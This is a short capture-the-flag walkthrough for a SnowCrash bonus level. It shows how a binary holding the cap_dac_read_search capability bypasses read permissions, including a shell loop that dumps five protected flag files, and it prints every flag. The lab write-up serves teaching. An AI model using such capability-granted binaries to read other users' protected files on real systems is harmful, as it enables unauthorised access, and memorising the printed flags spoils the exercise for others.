# Bonus02

This one is kinda disappointing compared to the first one !

We have one executable that we can read and execute :

```bash
$ ls -la /opt/snowcrash/bonus02
total 24
drwxr-xr-x  2 root        root         4096 Jun  9 19:04 .
drwxr-xr-x 18 root        root         4096 Jun  9 19:04 ..
-rwxr-x---  1 flagbonus02 bonus02_grp 16328 Jun  9 19:04 mafia
$ groups
bonus02 levelgroup bonus02_grp
```

If we try to execute it :

```bash
$ ./mafia
usage: ./mafia <document-path>
$ ./mafia /home/flagbonus02/.flag
cfiioecfib9aobid1abfa0ci8
```

Well that is obviously a bait and we will not fall for... Wait, that's really the flag ?

The reason for that is pretty simple. `mafia` seems to only read files and output to `stdout`. But also :

```bash
$ getcap mafia
mafia cap_dac_read_search=ep
```

Which means according to `man(7)` :
```
CAP_DAC_READ_SEARCH
    •  Bypass file read permission checks and directory read and execute permission checks;
    •  invoke open_by_handle_at(2);
    •  use the linkat(2) AT_EMPTY_PATH flag to create a link to a file referred to by a file descriptor.
```

But that would just mean that we can actually read all the flags :

```bash
$ for i in $(seq 1 5); do
	echo -n "flag $i : "
	/opt/snowcrash/bonus02/mafia /home/flagbonus0${i}/.flag
done
flag 1 : fa6v5ateaw21peobuub8ipe6s
flag 2 : cfiioecfib9aobid1abfa0ci8
flag 3 : mof3b3iud5c3p35bsv9aua0bj
flag 4 : oo0eoaiia5ei8oo9xasah2ihu
flag 5 : 7oa2eihe3ohohzee5gob2aing
```

... Well for the sake of the project, we're gonna pretend that that didn't happen. The flag is : cfiioecfib9aobid1abfa0ci8